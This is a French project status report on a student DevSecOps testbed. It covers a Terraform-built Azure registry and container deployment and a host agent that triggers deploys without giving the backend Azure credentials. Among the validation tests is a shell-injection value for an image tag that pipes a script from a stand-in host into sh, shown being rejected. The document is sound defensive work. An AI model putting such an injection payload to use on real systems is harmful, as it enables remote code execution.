# État du déploiement Azure — devsecops-testbed

## Ce qui est prouvé aujourd'hui (2026-08-08)

- **Le backend déclenche réellement un déploiement Azure** (push/pull ACR +
  ACI) via l'agent hôte, sans détenir aucun credential Azure. Détail dans
  "Déploiement piloté par le backend" ci-dessous.

## Ce qui était prouvé le 2026-08-06

- Infra durable (Terraform, `infra/terraform/`) : resource group `rg-pfe-devsecops`
  + ACR `acrpfedevsecops` (Basic) créés en `francecentral`, vérifiés `Succeeded`
  côté Azure (pas juste déclarés par Terraform).
- Image `devsecops-testbed:latest` (originale, vulnérable) buildée et poussée
  avec succès sur l'ACR.
- **Déploiement ACI prouvé sur image à base cohérente (`eclipse-temurin:11`) —
  Spring Running, 0 crash.** L'image vulnérable originale (base Java 8) crashe,
  comme attendu. Détail dans "Fondation prouvée" ci-dessous.

## Fondation prouvée : ACI Running sur image corrigée séparée

Pour prouver que la chaîne Azure (ACR → ACI privé) fonctionne réellement, sans
toucher au dépôt `devsecops-testbed` (le Dockerfile original vulnérable reste
la cible des scans Trivy, inchangé), un Dockerfile de test **temporaire** a été
créé hors de ce dépôt : `infra/docker/Dockerfile.fixed-base-testbed`. Seule
différence avec l'original : `eclipse-temurin:11-jre` au lieu de
`eclipse-temurin:8-jdk`, cohérent avec le bytecode Java 11 du jar. Même jar
réutilisé (`target/devsecops-testbed-1.0.0.jar`), aucun fichier de
`devsecops-testbed` modifié.

Image poussée sous un tag distinct : `acrpfedevsecops.azurecr.io/devsecops-testbed:fixed-base-1.0.0`.
L'ACR contient les deux tags (`latest` = vulnérable, `fixed-base-1.0.0` = corrigée).

Conteneur ACI de preuve (`aci-devsecops-testbed-fixed`, privé, `ipAddress: null`,
port 8080, cpu 1 / mémoire 1 Go) :

- État sur 45s (9 checks à 5s d'intervalle) : **`Running` en continu**, jamais `Terminated`.
- `restartCount` : **0** — pas de crash-loop.
- Logs : `Started TestbedApplication in 9.285 seconds`, Tomcat sur le port 8080,
  **aucun `UnsupportedClassVersionError`**.
- `/api/health` testé depuis l'intérieur du conteneur (`az container exec`, pas
  d'IP publique) → **`{"status":"UP"}`**.

Conteneur de preuve arrêté puis supprimé après vérification (pas de coût résiduel).

## Déploiement piloté par le backend — session Azure de l'hôte, pas de service principal

### Pourquoi pas un service principal

Un SP scopé au strict minimum (`AcrPush` sur l'ACR + `Azure Container
Instances Contributor Role` sur `rg-pfe-devsecops` uniquement) était l'option
retenue initialement — moindre privilège, credential dédié, révocable
indépendamment du compte personnel. **Impossible à créer** : le tenant Azure
AD `esprit.tn` bloque la création d'App Registration pour ce compte
(`allowedToCreateApps: false`, politique d'autorisation du tenant, vérifié via
Microsoft Graph), malgré un rôle Owner sur la subscription (RBAC Azure ≠
permissions Entra ID — deux systèmes séparés). Pas d'admin Entra ID
sollicitable pour ce projet. Aucune subscription alternative disponible avec
les mêmes ACR/RG déjà en place.

### Architecture retenue : le backend délègue, il ne détient jamais de token

```
Frontend (bouton Déployer, futur)
        │ JWT
        ▼
Backend (conteneur Docker, pfe-backend)      ── AUCUN credential Azure ici
        │ HTTP + secret partagé (X-Agent-Secret)
        │ body = { project, imageTag } UNIQUEMENT — jamais de commande
        │ → 172.19.0.1:7799 (gateway du bridge Docker "pfe-network")
        ▼
Agent hôte (infra/azure-deploy-agent/agent.py) ── seul processus à lire ~/.azure
        │ az acr login / az acr credential show / az container create
        │ (tous les paramètres sauf imageTag viennent de PROJECTS, fixé
        │  dans le code de l'agent — jamais du corps de la requête)
        ▼
Azure (ACR acrpfedevsecops + ACI rg-pfe-devsecops)
```

Le refresh token MSAL de la session personnelle (`~/.azure/msal_token_cache.json`)
donne un accès **Owner sur toute la subscription** — bien plus large que ce
qu'un SP scopé aurait donné. Le laisser **ne jamais quitter l'hôte** (jamais
monté dans un conteneur, jamais transmis au backend) est donc la seule façon
de ne pas regagner en surface d'attaque ce qu'on a perdu en granularité :
compromettre le conteneur backend (dépendances npm, réseau exposé) ne donne
accès qu'au déclenchement d'un déploiement pré-défini, jamais au token lui-même.

#### Cycle de vie de l'agent (process hôte, pas un conteneur)

Service **systemd utilisateur**, PAS dans `docker-compose.yml` — il doit
tourner sur l'hôte pour lire `~/.azure`, jamais dans un conteneur Docker :

```bash
# Installation (une fois)
mkdir -p ~/.config/systemd/user
cp infra/azure-deploy-agent/azure-deploy-agent.service ~/.config/systemd/user/
loginctl enable-linger "$(whoami)"     # survit même sans session interactive active
systemctl --user daemon-reload
systemctl --user enable --now azure-deploy-agent.service

# Statut / logs
systemctl --user status azure-deploy-agent.service
journalctl --user -u azure-deploy-agent.service -f
```

`Restart=on-failure` dans l'unit → un crash relance le process en ~1s,
prouvé (`kill -9` sur le PID → nouveau PID actif en moins de 2s). Le secret
`AZURE_DEPLOY_AGENT_SECRET` est lu via `EnvironmentFile=infra/azure-deploy-agent/.env`
(gitignored — règle `.env` globale du repo), jamais écrit dans l'unit versionné.
`loginctl enable-linger` fait que le service redémarre automatiquement après
un redémarrage de la machine, sans attendre une connexion interactive.

#### Sécurité de l'écoute

Lié explicitement à `172.19.0.1` (gateway du bridge Docker `pfe-network`),
jamais à `0.0.0.0` :
```
$ ss -tlnp | grep 7799
LISTEN 0 5 172.19.0.1:7799 0.0.0.0:*  users:(("python3",...))
```
Vérifié : `127.0.0.1:7799` (loopback) refuse la connexion — seuls les
conteneurs du réseau `pfe-network` (dont `pfe-backend`) peuvent atteindre
l'agent, pas le reste de la machine ni le LAN.

#### Périmètre des commandes — SCRIPT FIXE, jamais une commande du backend

Le backend ne peut envoyer que `{ project: "devsecops-testbed", imageTag: "..." }`.
**Tout le reste — `resourceGroup`, `containerName`, image complète (dépôt
ACR), `cpu`, `memoryInGb`, `ports` — vient exclusivement du dict `PROJECTS`
codé en dur dans `agent.py`, jamais du corps de la requête.** Trois couches,
chacune suffisante seule :

1. **Whitelist de projet** : `project` doit correspondre EXACTEMENT à une clé
   de `PROJECTS`. Une clé inconnue → `400 UNKNOWN_PROJECT`, rien n'est exécuté.
2. **Validation stricte du seul champ variable** (`imageTag`) : regex
   `^[A-Za-z0-9_][A-Za-z0-9._-]{0,127}$` (charset officiel des tags Docker) —
   rejette tout séparateur shell (`;`, `&&`, `|`, `` ` ``, `$()`, espace).
3. **Aucune commande shell construite par concaténation de texte** pour les
   valeurs externes : `az container create` est appelé via
   `subprocess.run([...liste...], shell=False)`, pas une f-string passée à
   `shell=True`. Sans shell, un `;` dans une valeur reste un caractère
   littéral du champ — il ne peut structurellement pas être interprété comme
   un séparateur de commande, même si la regex de la couche 2 avait un trou.

Testé (3 tentatives, toutes rejetées avant tout appel `az`) :
```
{"project":"totally-not-registered","imageTag":"latest"}
→ 400 UNKNOWN_PROJECT

{"project":"devsecops-testbed","imageTag":"x; curl http://evil.example/pwn.sh | sh #"}
→ 400 INVALID_IMAGE_TAG

{"resourceGroup":"rg-musee-virtuel","containerName":"whatever","image":"whatever:latest"}
→ 400 (project/imageTag manquants — l'ancien format à champs libres n'existe
       plus, il n'y a même pas de code qui saurait quoi en faire)
```

Garde-fous restants, dans l'ordre à chaque appel légitime :
1. Secret partagé absent côté agent → l'agent refuse de démarrer (fail-closed).
2. Secret fourni par le backend invalide → `403`, rien d'exécuté.
3. `project`/`imageTag` invalides → `400` (voir ci-dessus).
4. `resourceGroup` résolu depuis `PROJECTS` vérifié `== rg-pfe-devsecops`
   explicitement quand même (défense en profondeur, même sur notre propre
   config fixe).
5. Session `az` invalide (`az account show` échoue) → `409` avec un message
   clair (`AZURE_SESSION_EXPIRED`, "faire az login"), jamais un crash ni une
   tentative de déploiement. Vérifié systématiquement à chaque déploiement,
   jamais mis en cache d'un appel précédent.

Secret partagé (`AZURE_DEPLOY_AGENT_SECRET`) : même pattern que
`N8N_CALLBACK_SECRET`/`N8N_INTERNAL_SECRET` — variable d'env dans
`backend/.env` (gitignored), `docker-compose.yml`, et
`infra/azure-deploy-agent/.env` (gitignored, lu par systemd). **Dette
notée** : comme les secrets N8N_*, il est en clair dans `docker-compose.yml`,
qui est lui-même versionné — cette modification spécifique n'est
volontairement PAS committée (secret changé à chaque régénération de
l'agent). Externalisation propre (fichier `.env` référencé par `env_file:`,
jamais de valeur littérale dans un fichier suivi par git) documentée comme
dette pour tous ces secrets, pas seulement celui-ci.

### Limite connue

Le déploiement ne fonctionne QUE si la session `az login` de l'hôte est
active. Ce n'est pas automatisable sans intervention humaine périodique
(`az login` expire). **En production, ce mécanisme ne serait pas utilisé** —
un service principal scopé (comme celui initialement visé) est la bonne
solution ; il est bloqué ici uniquement par la politique du tenant Esprit,
propre à cet environnement d'études, pas une limite d'architecture.

### Preuve (2026-08-08)

Déploiement déclenché par un appel HTTP au backend (`POST
/api/azure-deploy/deploy`, body `{"project":"devsecops-testbed","imageTag":"fixed-base-1.0.0"}`),
pas depuis un terminal :

- `az acr login` + `az acr credential show` : OK (via la session hôte).
- `az container create` (argv liste, image `fixed-base-1.0.0` déjà prouvée,
  ACR `acrpfedevsecops`, RG `rg-pfe-devsecops` résolus depuis `PROJECTS`) : OK.
- État poll jusqu'à `Running`, `restartCount: 0`.
- `/api/health` via `az container exec` (pas d'IP publique, cohérent avec la
  preuve du 06/08), retry court (jusqu'à 30s — "Running" ACI précède de
  quelques secondes l'ouverture du port Spring Boot) → `{"status":"UP"}`.
- Garde-fou session testé positif (`~/.azure` temporairement absent →
  réponse `409 AZURE_SESSION_EXPIRED` propre côté backend, pas de crash) et
  négatif (session restaurée → `200`).
- Les 3 tentatives d'entrées invalides ci-dessus (projet inconnu, injection
  shell dans imageTag, ancien format à champs libres) → toutes `400`, aucun
  appel `az` déclenché.
- Cycle de vie : service systemd actif, `kill -9` du process → relancé
  automatiquement (< 2s), toujours fonctionnel après.
- Conteneur de preuve supprimé immédiatement après vérification (pas de coût
  résiduel), comme pour la preuve du 06/08.

## Échec du déploiement ACI sur l'image originale (non corrigée)

Le conteneur ACI (`aci-devsecops-testbed`, privé, pas d'IP publique) crash au
démarrage avec :

```
UnsupportedClassVersionError: com/vermeg/testbed/TestbedApplication has been
compiled by a more recent version of the Java Runtime (class file version 55.0),
this version of the Java Runtime only recognizes class file versions up to 52.0
```

Cause : le `Dockerfile` de `devsecops-testbed` utilise `eclipse-temurin:8-jdk`
alors que le code est compilé en Java 11 (`pom.xml` : `java.version=11`). C'est
une des failles **volontaires** du testbed (image de base obsolète, détectable
par Trivy) — mais son auteur n'avait pas remarqué qu'elle rend le jar
inexécutable. Reproduit à l'identique en local (`docker run`), donc indépendant
d'Azure/Terraform/ACI.

## Conséquence pour la démo

La version **non corrigée** ne peut pas tourner — ce qui est cohérent avec le
principe : on ne déploie pas de code vulnérable tel quel. Le déploiement ACI
fonctionnel sera prouvé sur la version **corrigée** (image de base Java 11+),
après passage par la plateforme DevSecOps.

## Reste à faire

- [x] Prouver que la chaîne ACR → ACI privé fonctionne (fait via l'image
      `fixed-base-1.0.0`, voir ci-dessus)
- [x] Prouver que le BACKEND (pas un terminal) peut déclencher ce
      déploiement, sans détenir de credential Azure (agent hôte, voir
      "Déploiement piloté par le backend" ci-dessus)
- [ ] Endpoint/notification/bouton "Déployer" côté plateforme (front +
      validation humaine avant déclenchement) — pas encore construit,
      volontairement hors scope de cette étape
- [ ] Rendre l'agent hôte persistant (aujourd'hui lancé manuellement en
      arrière-plan, pas de service systemd/supervision)
- [ ] Décider comment corriger `devsecops-testbed` pour de vrai (recompiler en
      ciblant Java 8 pour garder l'image de base volontairement vulnérable, ou
      changer l'image de base — décision à prendre, voir options discutées en
      session)
- [ ] Une fois `devsecops-testbed` corrigé dans son propre dépôt, rejouer le
      déploiement ACI sur l'image officielle (pas le tag `fixed-base-1.0.0` de
      test) et documenter ici
